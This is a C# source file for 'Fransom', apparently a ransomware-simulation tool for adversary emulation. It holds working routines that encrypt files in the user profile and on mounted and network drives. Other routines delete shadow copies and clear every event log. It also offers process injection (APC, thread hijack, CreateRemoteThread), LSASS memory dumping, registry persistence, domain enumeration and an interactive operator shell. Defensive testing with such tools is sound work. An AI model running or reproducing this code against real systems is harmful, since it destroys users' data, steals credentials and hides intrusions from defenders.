using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using CommandLine;
using CommandLine.Text;
using Figgle;

namespace Fransom
{
	class Program
	{
		[DllImport("mpr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern int WNetGetConnection(
		[MarshalAs(UnmanagedType.LPTStr)] string localName,
		[MarshalAs(UnmanagedType.LPTStr)] StringBuilder remoteName,
		ref int length);

		class Options
		{
			[Option("enumerate-user-profile", HelpText = "List all files and folders under the current user profile.", Group = "arguments")]
			public bool EnumerateUserProfile { get; set; }
			[Option("encrypt-user-profile", HelpText = "Encrypt all files (recursively) under the current user profile.", Group = "arguments")]
			public bool EncryptUserProfile { get; set; }
			[Option("decrypt-user-profile", HelpText = "Decrypt all encrypted files (recursively) under the current user profile.", Group = "arguments")]
			public bool DecryptUserProfile { get; set; }
			[Option("create-local-dummy-data", HelpText = "Create a folder named 'Fransom' on the user Desktop with dummy data, encrypt and delete them.", Group = "arguments")]
			public bool CreateLocalDummyData { get; set; }
			[Option("cleanup-user-profile", HelpText = "Remove all encrypted / decrypted files under the user profile generated by Fransom.", Group = "arguments")]
			public bool CleanupUserProfile { get; set; }
			[Option("enumerate-mounted-drives", HelpText = "List mounted drives, including potential network shares.", Group = "arguments")]
			public bool EnumerateMountedDrives { get; set; }
			[Option("encrypt-mounted-drives", HelpText = "Encrypt the content of mounted drives (recursively, excluding the OS disk), including potential network shares.", Group = "arguments")]
			public bool EncryptMountedDrives { get; set; }
			[Option("decrypt-mounted-drives", HelpText = "Decrypt all encrypted files in mounted drives (recursively, excluding the OS disk), including potential network shares.", Group = "arguments")]
			public bool DecryptMountedDrives { get; set; }
			[Option("create-mounted-drives-dummy-data", HelpText = "Create a folder named 'Fransom' on each mounted drives (excluding the OS disk) with dummy data, encrypt and delete them.", Group = "arguments")]
			public bool CreateMountedDrivesDummyData { get; set; }
			[Option("cleanup-mounted-drives", HelpText = "Remove all encrypted / decrypted files in mounted drives generated by Fransom.", Group = "arguments")]
			public bool CleanupMountedDrives { get; set; }
			[Option("enumerate-shadow-copies", HelpText = "(Requires Admin privileges) List all available shadow copies.", Group = "arguments")]
			public bool EnumerateShadowCopies { get; set; }
			[Option("delete-shadow-copies", HelpText = "(Requires Admin privileges) Create a dummy shadow copy and deletes it.", Group = "arguments")]
			public bool DeleteShadowCopies { get; set; }
			[Option("net-assembly-injection", HelpText = "(Requires FransomDLL.dll file to be located in the same directory as the program executable) Injects a pre-compiled .NET assembly in memory that will execute the same function as 'create-local-dummy-data'.", Group = "arguments")]
			public bool NetAssemblyInjection { get; set; }
			[Option("kill-office-applications", HelpText = "Terminates all open office processes.", Group = "arguments")]
			public bool KillOfficeApplications { get; set; }
			[Option("thread-inject", HelpText = "Inject a thread into a running process.", Group = "arguments")]
			public int ThreadInject { get; set; }
			[Option("apc-inject", HelpText = "APC injection into any process. Give PID as parameter", Group = "arguments")]
			public int APCInject { get; set; }
			[Option("apc-inject-new-process", HelpText = "APC injection into a process (notepad.exe).", Group = "arguments")]
			public bool APCInjectNewProcess { get; set; }
			[Option("remote-thread", HelpText = "Process injection with CreateRemoteThread. Give PID as parameter", Group = "arguments")]
			public int RemoteThread { get; set; }
			[Option("delete-eventlogs", HelpText = "Delete event logs from the local machine.", Group = "arguments")]
			public bool DeleteLogs { get; set; }
			[Option("dump-lsass", HelpText = "Dump LSASS process memory.", Group = "arguments")]
			public bool DumpLsass { get; set; }
			[Option("userregkey", HelpText = "Persistence via registry run key.", Group = "arguments")]
			public bool UserRegKey { get; set; }
			[Option("userregkey-clean", HelpText = "Clear registry peristence.", Group = "arguments")]
			public bool UserRegKeyClear { get; set; }
			[Option("ps", HelpText = "Helper: List running processes.", Group = "arguments")]
			public bool ListProcesses { get; set; }
			[Option("domain-users", HelpText = "List domain users.", Group = "arguments")]
			public bool EnumDomainUsers { get; set; }
			[Option("domain-groups", HelpText = "List domain groups.", Group = "arguments")]
			public bool EnumDomainGroups { get; set; }
			[Option("domain-computers", HelpText = "List domain computers.", Group = "arguments")]
			public bool EnumDomainComputers { get; set; }
			[Option("domain-trusts", HelpText = "List domain trusts", Group = "arguments")]
			public bool EnumDomainTrusts { get; set; }
			[Option("shell", HelpText = "Drop into an interactive shell", Group = "arguments")]
			public bool Shell { get; set; }
		}

		public static string password = "a1b2c3d4e5f6";

        static void DisplayHelpShell()
        {
			Console.WriteLine();
			Console.WriteLine("enumerate-user-profile\t\t\tList all files and folders under the current user profile.");
            Console.WriteLine("encrypt-user-profile\t\t\tEncrypt all files (recursively) under the current user profile.");
            Console.WriteLine("decrypt-user-profile\t\t\tDecrypt all encrypted files (recursively) under the current user profile.");
            Console.WriteLine("create-local-dummy-data\t\t\tCreate a folder named 'Fransom' on the user Desktop with dummy data, encrypt and delete them.");
            Console.WriteLine("cleanup-user-profile\t\t\tRemove all encrypted / decrypted files under the user profile generated by Fransom.");
            Console.WriteLine("enumerate-mounted-drives\t\tList mounted drives, including potential network shares.");
            Console.WriteLine("encrypt-mounted-drives\t\t\tEncrypt the content of mounted drives (recursively, excluding the OS disk), including potential network shares.");
            Console.WriteLine("decrypt-mounted-drives\t\t\tDecrypt all encrypted files in mounted drives (recursively, excluding the OS disk), including potential network shares.");
            Console.WriteLine("create-mounted-drives-dummy-data\tCreate a folder named 'Fransom' on each mounted drives (excluding the OS disk) with dummy data, encrypt and delete them.");
            Console.WriteLine("cleanup-mounted-drives\t\t\tRemove all encrypted / decrypted files in mounted drives generated by Fransom.");
            Console.WriteLine("enumerate-shadow-copies\t\t\t(Requires Admin privileges) List all available shadow copies.");
            Console.WriteLine("delete-shadow-copies\t\t\t(Requires Admin privileges) Create a dummy shadow copy and deletes it.");
            Console.WriteLine("net-assembly-injection\t\t\t(Requires FransomDLL.dll file to be located in the same directory as the program executable) Injects a pre-compiled .NET assembly in memory that will execute the same function as 'create-local-dummy-data'.");
            Console.WriteLine("kill-office-applications\t\tTerminates all open office processes.");
            Console.WriteLine("thread-inject\t\t\t\tInject a thread into a running process.");
            Console.WriteLine("apc-inject\t\t\t\tAPC injection into any process. Give PID as parameter");
            Console.WriteLine("apc-inject-new-process\t\t\tAPC injection into a process (notepad.exe).");
            Console.WriteLine("remote-thread\t\t\t\tProcess injection with CreateRemoteThread. Give PID as parameter");
            Console.WriteLine("delete-eventlogs\t\t\tDelete event logs from the local machine.");
            Console.WriteLine("dump-lsass\t\t\t\tDump LSASS process memory.");
            Console.WriteLine("userregkey\t\t\t\tPersistence via registry run key.");
            Console.WriteLine("userregkey-clean\t\t\tClear registry peristence.");
            Console.WriteLine("ps\t\t\t\t\tList running processes.");
            Console.WriteLine("domain-users\t\t\t\tList domain users.");
            Console.WriteLine("domain-groups\t\t\t\tList domain groups.");
            Console.WriteLine("domain-computers\t\t\tList domain computers.");
            Console.WriteLine("domain-trusts\t\t\t\tList domain trusts");
			Console.WriteLine("exit\t\t\t\t\tExit the interactive shell");
			Console.WriteLine();
        }

        static void Main(string[] args)
		{
			var parser = new CommandLine.Parser(with => with.HelpWriter = null);
			var parserResult = parser.ParseArguments<Options>(args);
			parserResult
			 .WithParsed<Options>(options => Run(options))
			 .WithNotParsed(errs => DisplayHelp(parserResult, errs));
		}

		static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errs)
		{
			var helpText = HelpText.AutoBuild(result, h =>
			{
				h.AdditionalNewLineAfterOption = false;
				h.Heading = FiggleFonts.Doom.Render("FRANSOM v0.6");
				h.Copyright = "Copyright (c) 2021 Fraktal Ltd.";
				return HelpText.DefaultParsingErrorsHandler(result, h);
			}, e => e);
			Console.WriteLine(helpText);
		}

		static void Run(Options options)
		{
			var pr = new Program();
			if (options.EnumerateUserProfile)
			{
				pr.EnumerateUserProfile();
			}
			else if (options.EncryptUserProfile)
			{
				pr.EncryptUserProfile();
			}
			else if (options.DecryptUserProfile)
			{
				DecryptUserProfile();
			}
			else if (options.CreateLocalDummyData)
			{
				LocalDummyDataCreation();
			}
			else if (options.CreateMountedDrivesDummyData)
			{
				MountedDrivesDummyDataCreation();
			}
			else if (options.CleanupUserProfile)
			{
				CleanupUserProfile();
			}
			else if (options.EnumerateMountedDrives)
			{
				pr.DoDriveEnumeration();
			}
			else if (options.EncryptMountedDrives)
			{
				pr.DoDriveEncryption();
			}
			else if (options.DecryptMountedDrives)
			{
				DoDriveDecryption();
			}
			else if (options.CleanupMountedDrives)
			{
				DoDriveCleanup();
			}
			else if (options.EnumerateShadowCopies)
			{
				EnumerateShadowCopies();
			}
			else if (options.DeleteShadowCopies)
			{
				pr.DeleteShadowCopies();
			}
			else if (options.NetAssemblyInjection)
			{
				pr.NetAssemblyInjection();
			}
			else if (options.KillOfficeApplications)
			{
				pr.KillOfficeApplications();
			}
			else if (options.ThreadInject > 0)
			{
				pr.DoThreadInjection(options.ThreadInject);
			}
			else if (options.APCInject > 0)
			{
				Console.WriteLine(options.APCInject);
				DoApcInjection(options.APCInject);
			}
			else if (options.APCInjectNewProcess)
			{
				pr.DoApcInjectionNewProcess();
			}
			else if (options.RemoteThread > 0)
			{
				DoRemoteThread(options.RemoteThread);
			}
			if (options.DeleteLogs)
			{
				foreach (var log in EventLog.GetEventLogs())
				{
					Console.WriteLine("Deleting " + log.LogDisplayName);
					log.Clear();
					log.Dispose();
				}
				Console.WriteLine("Done, all event logs gone!");
			}
			if (options.UserRegKey)
			{
				var p = new Persistence();
				p.UserRegKey();
			}
			if (options.UserRegKeyClear)
			{
				var p = new Persistence();
				p.CleanupUserRegKey();
			}
			if (options.DumpLsass)
			{
				var d = new DumpLSASS();
				d.Run();
			}
			if (options.ListProcesses)
			{
				var e = new Enumerate();
				e.EnumerateProcesses();
			}
			if (options.EnumDomainUsers)
			{
				var e = new Enumerate();
				e.EnumerateDomainUsers();
			}
			if (options.EnumDomainGroups)
			{
				var e = new Enumerate();
				e.EnumerateDomainGroups();
			}
			if (options.EnumDomainComputers)
			{
				var e = new Enumerate();
				e.EnumerateDomainComputers();
			}
			if (options.EnumDomainTrusts)
			{
				var e = new Enumerate();
				e.EnumerateDomainTrusts();
			}
			if (options.Shell)
            {
				InteractiveShell();
            }
		}

		static void InteractiveShell()
        {
            string command = "";
            string line = "";
            int process_id;
            var d = new DumpLSASS();
            var p = new Persistence();
            var e = new Enumerate();
            var pr = new Program();
            Console.WriteLine();
			Console.WriteLine(FiggleFonts.Doom.Render("FRANSOM v0.6"));
			Console.WriteLine("Copyright (c) 2021 Fraktal Ltd.");
            Console.WriteLine();
            while (command != "exit")
            {
                Console.Write("FRANSOM> ");
                command = Console.ReadLine();
                switch (command)
                {
                    case "help":
                        DisplayHelpShell();
                        break;
                    case "enumerate-user-profile":
                        pr.EnumerateUserProfile();
                        break;
                    case "encrypt-user-profile":
                        pr.EncryptUserProfile();
                        break;
                    case "decrypt-user-profile":
                        DecryptUserProfile();
                        break;
                    case "create-local-dummy-data":
                        LocalDummyDataCreation();
                        break;
                    case "cleanup-user-profile":
                        CleanupUserProfile();
                        break;
                    case "enumerate-mounted-drives":
                        pr.DoDriveEnumeration();
                        break;
                    case "encrypt-mounted-drives":
                        pr.DoDriveEncryption();
                        break;
                    case "decrypt-mounted-drives":
                        DoDriveDecryption();
                        break;
                    case "create-mounted-drives-dummy-data":
                        MountedDrivesDummyDataCreation();
                        break;
                    case "cleanup-mounted-drives":
                        DoDriveCleanup();
                        break;
                    case "enumerate-shadow-copies":
                        EnumerateShadowCopies();
                        break;
                    case "delete-shadow-copies":
                        pr.DeleteShadowCopies();
                        break;
                    case "net-assembly-injection":
                        pr.NetAssemblyInjection();
                        break;
                    case "kill-office-applications":
                        pr.KillOfficeApplications();
                        break;
                    case "thread-inject":
                        Console.Write("Enter process ID: ");
                        line = Console.ReadLine();
                        if (int.TryParse(line, out process_id))
                        {
                            pr.DoThreadInjection(process_id);
                        }
                        else
                        {
                            Console.WriteLine("The value provided is not a valid process id.");
                        }
                        break;
                    case "apc-inject":
                        Console.Write("Enter process ID: ");
                        line = Console.ReadLine();
                        if (int.TryParse(line, out process_id))
                        {
                            DoApcInjection(process_id);
                        }
                        else
                        {
                            Console.WriteLine("The value provided is not a valid process id.");
                        }
                        break;
                    case "apc-inject-new-process":
                        pr.DoApcInjectionNewProcess();
                        break;
                    case "remote-thread":
                        Console.Write("Enter process ID: ");
                        line = Console.ReadLine();
                        if (int.TryParse(line, out process_id))
                        {
                            DoRemoteThread(process_id);
                        }
                        else
                        {
                            Console.WriteLine("The value provided is not a valid process id.");
                        }
                        break;
                    case "delete-event-logs":
                        pr.DeleteEventLogs();
                        break;
                    case "dump-lsass":
                        d.Run();
                        break;
                    case "userregkey":
                        p.UserRegKey();
                        break;
                    case "userregkey-clean":
                        p.CleanupUserRegKey();
                        break;
                    case "ps":
                        e.EnumerateProcesses();
                        break;
                    case "domain-users":
                        e.EnumerateDomainUsers();
                        break;
                    case "domain-groups":
                        e.EnumerateDomainGroups();
                        break;
                    case "domain-computers":
                        e.EnumerateDomainComputers();
                        break;
                    case "domain-trusts":
                        e.EnumerateDomainTrusts();
                        break;
                    case "domain-shares":
                        e.EnumerateDomainShares();
                        break;                  
                    case "exit":
                        break;
                    default:
                        Console.WriteLine("Invalid command - enter \"help\" to list all available options.");
                        break;
                }
            }
        }

		static StringCollection EnumeratePath(StringCollection allFiles, string path, string ext, bool scanDirOk)
		{
			string[] files = Directory.GetFiles(path, ext);
			foreach (string value in files)
			{
				bool flag = !allFiles.Contains(value);
				if (flag)
				{
					allFiles.Add(value);
				}
			}
			if (scanDirOk)
			{
				string[] directories = Directory.GetDirectories(path);
				bool flag2 = directories.Length != 0;
				if (flag2)
				{
					foreach (string text in directories)
					{
						try
						{
							EnumeratePath(allFiles, text, ext, scanDirOk);
						}
						catch (UnauthorizedAccessException)
						{
							Console.WriteLine("Access Denied for folder " + text);
						}
						catch (Exception e)
						{
							Console.WriteLine("Error: {0}", e.Message);
						}
					}
				}
			}
			return allFiles;
		}

		static void EncryptFile(string inputFileName, string outputFileName, string password)
		{
			try
			{
				FileStream inFile = new FileStream(inputFileName, FileMode.Open, FileAccess.Read);
				FileStream outFile = new FileStream(outputFileName, FileMode.OpenOrCreate, FileAccess.Write);
				RijndaelManaged algorithm = new RijndaelManaged();
				Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, Encoding.ASCII.GetBytes("Salt123456"));

				algorithm.Key = key.GetBytes(algorithm.KeySize / 8);
				algorithm.IV = key.GetBytes(algorithm.BlockSize / 8);

				byte[] fileData = new byte[4096];
				CryptoStream encryptedStream = new CryptoStream(outFile, algorithm.CreateEncryptor(), CryptoStreamMode.Write);

				while (inFile.Read(fileData, 0, fileData.Length) != 0)
				{
					encryptedStream.Write(fileData, 0, fileData.Length);
				}

				encryptedStream.Flush();
				encryptedStream.Close();
				inFile.Close();
				outFile.Close();
			}
			catch (Exception e)
			{
				Console.WriteLine("Error: {0}", e.Message);
			}
		}
		static void DecryptFile(string inputFileName, string outputFileName, string password)
		{
			FileStream inFile = new FileStream(inputFileName, FileMode.Open, FileAccess.Read);
			FileStream outFile = new FileStream(outputFileName, FileMode.OpenOrCreate, FileAccess.Write);
			RijndaelManaged algorithm = new RijndaelManaged();
			Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, Encoding.ASCII.GetBytes("Salt123456"));

			algorithm.Key = key.GetBytes(algorithm.KeySize / 8);
			algorithm.IV = key.GetBytes(algorithm.BlockSize / 8);

			byte[] fileData = new byte[4096];
			CryptoStream encryptedStream = new CryptoStream(inFile, algorithm.CreateDecryptor(), CryptoStreamMode.Read);

			while (encryptedStream.Read(fileData, 0, fileData.Length) != 0)
			{
				outFile.Write(fileData, 0, fileData.Length);
			}

			encryptedStream.Flush();
			encryptedStream.Close();
			inFile.Close();
			outFile.Close();
		}
		private static string GetUNCPath(string drivePath)
		{
			StringBuilder sb = new StringBuilder(512);
			int size = sb.Capacity;

			if (drivePath.Length > 2 && drivePath[1] == ':')
			{
				char c = drivePath[0];
				if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z'))
				{
					int error = WNetGetConnection(drivePath.Substring(0, 2),
						sb, ref size);
					if (error == 0)
					{
						DirectoryInfo dir = new DirectoryInfo(drivePath);

						string path = Path.GetFullPath(drivePath)
							.Substring(Path.GetPathRoot(drivePath).Length);
						return Path.Combine(sb.ToString().TrimEnd(), path);
					}
				}
			}

			return drivePath;
		}

		public void DoDriveEnumeration()
		{
			DriveInfo[] allDrives = DriveInfo.GetDrives();

			foreach (DriveInfo d in allDrives)
			{
				Console.WriteLine("Drive {0}", d.Name);
				Console.WriteLine("  Drive type: {0}", d.DriveType);
				if (d.IsReady == true)
				{
					Console.WriteLine("  Volume label: {0}", d.VolumeLabel);
					Console.WriteLine("  File system: {0}", d.DriveFormat);
					Console.WriteLine("  UNC path: {0}", Program.GetUNCPath(d.Name));
				}
			}
		}
		public void DoDriveEncryption()
		{
			DriveInfo[] allDrives = DriveInfo.GetDrives();

			foreach (DriveInfo d in allDrives)
			{
				if (d.DriveType != DriveType.Network || d.DriveType != DriveType.Removable)
				{
					continue;
				}
				string DrivePath = Program.GetUNCPath(d.Name);
				if (DrivePath != "C:\\" && DrivePath != "D:\\")
				{
					StringCollection stringCollection = new StringCollection();
					EnumeratePath(stringCollection, DrivePath, "*.*", true);
					foreach (object obj in stringCollection)
					{
						string file_name = obj.ToString();
						Console.WriteLine("Encrypting object: " + file_name);
						string enc_file = file_name + ".enc";
						EncryptFile(file_name, enc_file, password);
					}
				}
			}
		}

		private static byte[] EncryptByteArray(byte[] Payload, byte[] Key, byte[] IV)
		{
			byte[] encrypted;
			using (RijndaelManaged rijAlg = new RijndaelManaged())
			{
				rijAlg.Key = Key;
				rijAlg.IV = IV;
				ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
				using (MemoryStream msEncrypt = new MemoryStream())
				{
					using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
					{
						using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
						{
							swEncrypt.Write(Payload);
						}
						encrypted = msEncrypt.ToArray();
					}
				}
			}
			return encrypted;
		}

		private static void DoDriveDecryption()
		{
			DriveInfo[] allDrives = DriveInfo.GetDrives();

			foreach (DriveInfo d in allDrives)
			{
				string DrivePath = Program.GetUNCPath(d.Name);
				if (DrivePath != "C:\\" && DrivePath != "D:\\")
				{
					StringCollection stringCollection = new StringCollection();
					EnumeratePath(stringCollection, DrivePath, "*.*", true);
					foreach (object obj in stringCollection)
					{
						string file_name = obj.ToString();
						string file_path = @file_name;
						if (Path.GetExtension(file_path) == ".enc")
						{
							Console.WriteLine("Decrypting object: " + file_name);
							string dec_file = Path.GetDirectoryName(file_name) + "\\" + Path.GetFileNameWithoutExtension(file_name) + ".dec";
							DecryptFile(file_name, dec_file.ToString(), password);
						}
					}
				}
			}
		}
		private static void DoDriveCleanup()
		{
			DriveInfo[] allDrives = DriveInfo.GetDrives();

			foreach (DriveInfo d in allDrives)
			{
				string DrivePath = Program.GetUNCPath(d.Name);
				if (DrivePath != "C:\\" && DrivePath != "D:\\")
				{
					string folder_path = DrivePath + "\\Fransom";
					if (Directory.Exists(folder_path))
					{
						Console.WriteLine("Found local dummy folder, removing it...");
						CleanupDummyFolder(folder_path);
						Console.WriteLine("Local dummy folder deleted.");
					}
					Console.WriteLine("");
					StringCollection stringCollection = new StringCollection();
					EnumeratePath(stringCollection, DrivePath, "*.*", true);
					foreach (object obj in stringCollection)
					{
						string file_name = obj.ToString();
						string file_path = @file_name;
						if (Path.GetExtension(file_path) == ".enc" || Path.GetExtension(file_path) == ".dec")
						{
							Console.WriteLine("Removing object: " + file_name);
							File.Delete(file_path);
						}
					}
				}
			}
		}
		private static void LocalDummyDataCreation()
		{
			string DirectoryName = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
			Console.WriteLine("Creating folder: " + DirectoryName);
			Console.WriteLine("");
			Directory.CreateDirectory(DirectoryName);
			string[] lines = { "First line", "Second line", "Third line" };
			for (int i = 0; i < 10; i++)
			{
				string fileName = DirectoryName + "\\test_file" + i + ".txt";
				Console.WriteLine("Creating file: " + fileName);
				File.WriteAllLines(fileName, lines);
			}
			Console.WriteLine("");
			StringCollection stringCollection = new StringCollection();
			EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables(DirectoryName), "*.*", true);
			foreach (object obj in stringCollection)
			{
				string file_name = obj.ToString();
				Console.WriteLine("Encrypting and deleting object: " + file_name);
				string enc_file = file_name + ".enc";
				EncryptFile(file_name, enc_file, password);
				File.Delete(file_name);
			}
		}
		private static void MountedDrivesDummyDataCreation()
		{

			DriveInfo[] allDrives = DriveInfo.GetDrives();

			foreach (DriveInfo d in allDrives)
			{
				string DrivePath = Program.GetUNCPath(d.Name);
				if (DrivePath != "C:\\" && DrivePath != "D:\\")
				{

					string DirectoryName = DrivePath + "\\Fransom";
					Console.WriteLine("Creating folder: " + DirectoryName);
					Console.WriteLine("");
					Directory.CreateDirectory(DirectoryName);
					string[] lines = { "First line", "Second line", "Third line" };
					for (int i = 0; i < 10; i++)
					{
						string fileName = DirectoryName + "\\test_file" + i + ".txt";
						Console.WriteLine("Creating file: " + fileName);
						File.WriteAllLines(fileName, lines);
					}
					Console.WriteLine("");
					StringCollection stringCollection = new StringCollection();
					EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables(DirectoryName), "*.*", true);
					foreach (object obj in stringCollection)
					{
						string file_name = obj.ToString();
						Console.WriteLine("Encrypting and deleting object: " + file_name);
						string enc_file = file_name + ".enc";
						EncryptFile(file_name, enc_file, password);
						File.Delete(file_name);
					}
				}
			}
		}
		private static void CleanupDummyFolder(string dummy_folder_path)
		{

			string[] files = Directory.GetFiles(dummy_folder_path);
			string[] dirs = Directory.GetDirectories(dummy_folder_path);

			foreach (string file in files)
			{
				File.SetAttributes(file, FileAttributes.Normal);
				File.Delete(file);
			}

			foreach (string dir in dirs)
			{
				CleanupDummyFolder(dir);
			}

			Directory.Delete(dummy_folder_path, false);
		}
		private static void EnumerateShadowCopies()
		{
			Process process = new Process();
			process.StartInfo.FileName = "vssadmin.exe";
			process.StartInfo.Arguments = "list shadows";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.Start();
			string output = process.StandardOutput.ReadToEnd();
			Console.WriteLine(output);
			string err = process.StandardError.ReadToEnd();
			Console.WriteLine(err);
			process.WaitForExit();
		}
		public static string getBetween(string strSource, string strStart, string strEnd)
		{
			if (strSource.Contains(strStart) && strSource.Contains(strEnd))
			{
				int Start, End;
				Start = strSource.IndexOf(strStart, 0) + strStart.Length;
				End = strSource.IndexOf(strEnd, Start);
				return strSource.Substring(Start, End - Start);
			}

			return "";
		}
		public void DeleteShadowCopies()
		{
			Console.WriteLine("");
			Console.WriteLine("Creating a dummy Shadow Copy on volume C:\\");
			Process process_create_sc = new Process();
			process_create_sc.StartInfo.FileName = "wmic.exe";
			process_create_sc.StartInfo.Arguments = "shadowcopy call create Volume='C:\\'";
			process_create_sc.StartInfo.UseShellExecute = false;
			process_create_sc.StartInfo.RedirectStandardOutput = true;
			process_create_sc.StartInfo.RedirectStandardError = true;
			process_create_sc.Start();
			string output = process_create_sc.StandardOutput.ReadToEnd();
			string err = process_create_sc.StandardError.ReadToEnd();
			process_create_sc.WaitForExit();
			string shadow_copy_id = getBetween(output, "ShadowID = \"", "\";");
			Console.WriteLine("Shadow Copy created successfully with ID: " + shadow_copy_id);
			Console.WriteLine("");
			Console.WriteLine("Deleting Shadow Copy with ID: " + shadow_copy_id);
			Process process_delete_sc = new Process();
			process_delete_sc.StartInfo.FileName = "vssadmin.exe";
			process_delete_sc.StartInfo.Arguments = "delete shadows /shadow=\"" + shadow_copy_id + "\" /quiet";
			process_delete_sc.StartInfo.UseShellExecute = false;
			process_delete_sc.StartInfo.RedirectStandardOutput = true;
			process_delete_sc.StartInfo.RedirectStandardError = true;
			process_delete_sc.Start();
			string result = process_delete_sc.StandardOutput.ReadToEnd();
			string excp = process_delete_sc.StandardError.ReadToEnd();
			process_delete_sc.WaitForExit();
			Console.WriteLine("Shadow Copy with ID: " + shadow_copy_id + " deleted successfully.");
			Console.WriteLine("");
		}
		public void NetAssemblyInjection()
		{
			string assembly = "FransomDLL.dll";
			var bytes = File.ReadAllBytes(assembly);
			var b64 = Convert.ToBase64String(bytes);
			NetInjection.Inject(b64);
		}
		public void KillOfficeApplications()
        {
			Console.WriteLine("");
			Console.WriteLine("Searching for running Office processes...");
			string[] office_apps = { "word", "winword", "excel", "outlook" };
			foreach (string office_app in office_apps)
            {
				foreach (var process in Process.GetProcessesByName(office_app))
				{
					Console.WriteLine("Found Office process " + office_app + ".exe, killing it.");
					process.Kill();
				}
			}
			Console.WriteLine("");
		}

        public void DoThreadInjection(int pid)
        {
            var t = new ThreadHijack();
            t.Run(pid);
        }

        private static void DoApcInjection(int pid)
        {
            var t = new APCInject();
            t.Run(pid);
        }

        public void DoApcInjectionNewProcess()
        {
            var t = new APCInjectNewProcess();
            t.Run();
        }

		public int FindExplorerPid()
        {
			Process[] explorer_process = Process.GetProcessesByName("explorer");
			int explorer_pid = explorer_process[0].Id;
			return explorer_pid;
		}

        private static void DoRemoteThread(int pid)
        {
            var t = new RemoteThread();
            t.Run(pid);
        }

		public void EnumerateUserProfile()
        {
			StringCollection stringCollection = new StringCollection();
			EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
			EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
			EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);

			foreach (object obj in stringCollection)
			{
				string text2 = obj.ToString();
				Console.WriteLine(text2);
			}
		}

		public void EncryptUserProfile()
        {
			StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);

            foreach (object obj in stringCollection)
            {
                string file_name = obj.ToString();
                Console.WriteLine("Encrypting object: " + file_name);
                string enc_file = file_name + ".enc";
                EncryptFile(file_name, enc_file, password);
            }
        }

		private static void DecryptUserProfile()
        {
			StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);

            foreach (object obj in stringCollection)
            {
                string file_name = obj.ToString();
                string file_path = @file_name;
                if (Path.GetExtension(file_path) == ".enc")
                {
                    Console.WriteLine("Decrypting object: " + file_name);
                    string dec_file = Path.GetDirectoryName(file_name) + "\\" + Path.GetFileNameWithoutExtension(file_name) + ".dec";
                    DecryptFile(file_name, dec_file.ToString(), password);
                }
            }
        }

		private static void CleanupUserProfile()
		{

			string folder_path = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
            if (Directory.Exists(folder_path))
            {
                Console.WriteLine("Found local dummy folder, removing it...");
                CleanupDummyFolder(folder_path);
                Console.WriteLine("Local dummy folder deleted.");
            }
            Console.WriteLine("");
            StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);


            foreach (object obj in stringCollection)
            {
                string file_name = obj.ToString();
                string file_path = @file_name;
                if (Path.GetExtension(file_path) == ".enc" || Path.GetExtension(file_path) == ".dec")
                {
                    Console.WriteLine("Removing object: " + file_name);
                    File.Delete(file_path);
                }
            }
        }

		public void DeleteEventLogs()
        {
			foreach (var log in EventLog.GetEventLogs())
            {
                Console.WriteLine("Deleting " + log.LogDisplayName);
                log.Clear();
                log.Dispose();
            }
            Console.WriteLine("Done, all event logs gone!");
        }

	}
}
